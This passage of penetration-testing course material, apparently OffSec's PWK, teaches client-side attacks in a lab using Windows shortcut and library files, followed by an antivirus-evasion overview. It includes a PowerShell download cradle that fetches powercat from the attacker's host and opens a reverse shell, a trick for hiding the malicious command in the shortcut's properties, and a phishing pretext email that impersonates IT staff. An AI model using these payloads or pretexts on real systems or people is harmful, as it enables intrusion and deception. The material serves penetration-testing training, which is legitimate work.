# Penetration Testing with Kali Linux

## Creating a Shortcut for the Offsec User

To create a shortcut on the desktop for the offsec user, follow these steps:

1. Right-click on the desktop and select **New** > **Shortcut**.
2. In the **Create Shortcut** window, enter the path to the program along with any arguments. For this example, we will point the shortcut to PowerShell and use a download cradle to load PowerCat from our Kali machine and start a reverse shell.

### Command to Use
```powershell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.3:8000/powercat.ps1'); powercat -c 192.168.119.3 -p 4444 -e powershell"
```

### Steps to Create the Shortcut
1. Enter the above command in the **Location** field of the **Create Shortcut** window.
2. Click **Next**.
3. If you expect that your victims might check where the shortcut files are pointing, you can add a delimiter and a benign command after the malicious one to push the malicious command out of the visible area in the file’s property menu.
4. Name the shortcut file as `automatic_configuration` and click **Finish** to create the file.

### Setting Up the Kali Machine
On your Kali machine, perform the following steps:

1. Start a Python3 web server on port 8000 to serve `powercat.ps1`.
2. Start a Netcat listener on port 4444 to receive the reverse shell.

```bash
kali@kali:~$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
```

### Verifying the Setup
Double-click the shortcut file on the desktop. After confirming that you want to run the application, the Netcat listener should receive a reverse shell.

```bash
connect to [192.168.119.2] from (UNKNOWN) [192.168.50.194] 49768
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
Install the latest PowerShell for new features and improvements!
https://aka.ms/PSWindows
PS C:\Windows\System32\WindowsPowerShell\v1.0>
```

### Obtaining a Reverse Shell from HR137
To obtain a reverse shell from the HR137 machine at 192.168.50.195, follow these steps:

1. Provide the Windows library file to a simulated victim with a pretext.
2. The pretext is an important aspect of this client-side attack. For example, you could tell the target that you are a new member of the IT team and need to configure all client systems for the new management platform. An example email content is shown below.

#### Example Email Content
```
Hello! My name is Dwight, and I'm a new member of the IT Team.
This week I am completing some configurations we rolled out last week.
To make this easier, I've attached a file that will automatically
perform each step. Could you download the attachment, open the
directory, and double-click "automatic_configuration"? Once you
confirm the configuration in the window that appears, you're all done!
If you have any questions, or run into any problems, please let me
know!
```

3. Copy `automatic_configuration.lnk` and `config.Library-ms` to your WebDAV directory on your Kali machine.
4. Use the config library file to copy the files into the directory. For this example, use the `\\192.168.50.195\share` SMB share to simulate the delivery step.
5. Start the Python3 web server on port 8000 to serve `powercat.ps1`, WsgiDAV for your WebDAV share `/home/kali/webdav`, and a Netcat listener on port 4444.

### Uploading the Library File to the SMB Share
Use `smbclient` to upload the library file to the SMB share.

```bash
kali@kali:~$ cd webdav
kali@kali:~/webdav$ smbclient //192.168.50.195/share -c 'put config.Library-ms'
Enter WORKGROUP\kali's password:
putting file config.Library-ms as \config.Library-ms (1.8 kb/s) (average 1.8 kb/s)
```

After the library file is opened by a simulated user on the system, the reverse shell should be executed.

```bash
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.119.2] from (UNKNOWN) [192.168.50.195] 56839
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
Install the latest PowerShell for new features and improvements!
https://aka.ms/PSWindows
PS C:\Windows\System32\WindowsPowerShell\v1.0> whoami
hr137\hsmith
```

### Conclusion
In this section, we learned about using Windows Library files and shortcuts to deliver a payload and establish a reverse shell. This technique can be combined with other client-side attacks, such as Office macro attacks, to effectively gain initial access to a target system.

---

## Wrapping Up

Client-side attack vectors are often effective for gaining an initial foothold in a non-routable internal network. They exploit weaknesses or leverage functionality in existing client software.

In this module, we covered how to gather information about targets, use Microsoft Office macros, Windows library files, and shortcut files to execute code and receive reverse shells.

---

## Antivirus Evasion

### Learning Units
- **Antivirus Software Key Components and Operations**
- **Bypassing Antivirus Detections**
- **Antivirus Evasion in Practice**

### Introduction
Attackers often disable or bypass antivirus software to compromise a target machine. As penetration testers, understanding and recreating these techniques is crucial to demonstrate potential threats to clients.

### Antivirus Software Key Components and Operations

#### Learning Objectives
- Recognize known vs. unknown threats
- Understand AV key components
- Understand AV detection engines

#### Overview
Antivirus (AV) software is designed to prevent, detect, and remove malicious software. It includes additional protections like IDS/IPS, firewalls, website scanners, and more.

#### Known vs. Unknown Threats
AV software traditionally uses signatures to identify specific malware. Modern AV solutions include Machine Learning (ML) engines to detect unknown threats. However, ML engines require an internet connection and can be resource-intensive.

#### Endpoint Detection and Response (EDR)
EDR solutions generate security-event telemetry and forward it to a Security Information and Event Management (SIEM) system. EDR complements AV by providing enhanced visibility and detection.

#### AV Engines and Components
A modern AV typically includes the following components:
- **File Engine**: Performs scheduled and real-time file scans.
- **Memory Engine**: Inspects process memory for suspicious activities.
- **Network Engine**: Monitors and blocks malicious network traffic.
- **Disassembler**: Translates machine code into assembly language.
- **Emulator/Sandbox**: Safely analyzes malware without affecting the system.
- **Browser Plugin**: Enhances visibility within browsers.
- **Machine Learning Engine**: Detects unknown threats using cloud resources.

#### Detection Methods
- **Signature-based Detection**: Scans for known malware signatures.
- **Heuristic-based Detection**: Identifies suspicious behaviors.
- **Behavioral Detection**: Monitors for abnormal activities.
- **Machine Learning Detection**: Uses algorithms to detect unknown threats.

### Example
As an example, we created a text file on our local Kali machine that contains the string “offsec”.

---

**PWK - Copyright © 2023 OffSec Services Limited. All rights reserved.**